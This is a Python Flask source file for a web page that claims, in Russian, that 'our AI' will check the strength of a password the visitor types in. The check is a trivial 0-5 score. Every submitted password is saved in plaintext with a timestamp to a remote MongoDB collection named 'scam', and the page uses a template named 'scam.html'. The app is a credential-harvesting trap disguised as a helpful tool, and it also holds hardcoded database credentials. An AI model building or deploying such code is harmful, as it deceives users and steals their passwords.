# -*- coding: utf-8 -*-
from flask import Flask, request, render_template
from pymongo import MongoClient
import datetime
import pytz

timezone = pytz.timezone("Europe/Moscow")
password = ''
cluster = MongoClient('mongodb+srv://ekfar1:1234@cluster0.dhafo.mongodb.net/bd?retryWrites=true&w=majority')
bd = cluster["bd"]
collection = bd["scam"]

def check_pass(password):
    lenght,digit,lower,upper,spec = 0,0,0,0,0
    if len(password) > 8:
       lenght = 1
    spec_chars = ".,:;!_*-+()/#%&-+="
    for pa in password:
        if pa.isdigit():
            digit = 1
        if pa.islower():
            lower = 1
        if pa.isupper():
            upper = 1
    for spec_char in spec_chars:
        if spec_char in password:
            spec = 1
    return str(lenght + digit + lower + upper + spec)

app = Flask(__name__)
@app.route('/', methods=['post', 'get'])
def index():
    password = None
    message = '''
Хотите убедиться в том что ваш пароль надежный?
Тогда вводите его в строку и наш ИИ проверит его и выдаст вам ответ
на основе тех данных которые вы ввели.
'''
    if request.method == 'POST':
        password = request.form.get('password')
    if password != None:
        time = datetime.datetime.now(timezone)
        message = check_pass(password)
        collection.insert_one({"pass":password,'time':time})
    return render_template('scam.html', message=message)
#http://127.0.0.1:5000/
if __name__ == "__main__":
    app.run(debug=False)
